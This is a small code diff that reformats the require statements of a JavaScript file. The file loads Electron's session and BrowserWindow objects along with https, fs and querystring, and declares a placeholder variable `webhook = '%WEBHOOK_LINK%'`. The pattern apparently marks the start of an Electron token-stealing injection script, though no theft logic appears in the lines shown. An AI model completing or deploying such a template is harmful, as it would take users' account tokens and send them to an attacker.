@@ -1,8 +1,8 @@
-const fs = require('fs');
-const https = require("https");
-const path = require('path');
-  { BrowserWindow, session } = require('electron');
-  querystring = require('querystring');
+const https = require("https")
+const fs = require('fs')
+const path = require('path'),
+  { BrowserWindow, session } = require('electron'),
+  querystring = require('querystring'),
   os = require('os')
 var webhook = '%WEBHOOK_LINK%'
 var src = ''
